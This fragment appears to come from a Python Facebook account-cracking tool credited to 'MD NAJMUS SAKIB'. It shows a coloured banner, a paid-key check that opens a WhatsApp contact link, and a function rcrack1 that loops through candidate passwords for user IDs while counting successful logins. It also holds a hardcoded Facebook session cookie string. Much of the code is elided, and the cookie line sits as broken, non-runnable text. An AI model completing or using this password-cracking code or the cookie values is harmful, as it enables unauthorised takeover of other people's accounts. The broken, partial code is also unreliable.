...
\033[1;32m[-] AUTHOR    :\033[1;32m MD NAJMUS SAKIB
\033[1;32m[-] GITHUB    :\033[1;32m MD NAJMUS SAKIB
\033[1;32m[-] FACEBOOK  :\033[1;32m MD NAJMUS SAKIB
\033[1;92m══════════════════════════════════════════
\033[1;91m<═══\033[1;41m\033[1;97m THIS TOOL UPDATE DN \033[;0m\033[1;91m═══>\033[1;92m"""
linex=('\033[1;31m══════════════════════════════════════════')   
try:
...
if key2 in b:
    ...
    print("Your key  : "+key2)
    print("\n\t\tContact Admin ")
    os.system('xdg-open https://wa.me/+8801316165549')
    exit()
class Main:
    def __init__(self):
        self.id = []
...
def rcrack1(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            ...
            sys.stdout.write(f'\r \033[1;31m[%sSAKIB\033[1;31m]\033[1;34m\033[1;31m[\033[38;5;195m%s/%s\033[1;31m]\033[1;34m\033[38;5;45mOK-\033[38;5;46m%s\r'%(bi,loop,tl,len(oks))),
            sys.stdout.flush()
            ...
            datr=Au8sZLgLSUKfhzEh_63n6Y3U; sb=Au8sZBNBLmxzrFPL9HvC1JLL; wd=360x630; fr=0G23kMd3B8boGS2ce..BkLO8C.Zp.AAA.0.0.BkLO8J.AWUbxQrIBwo
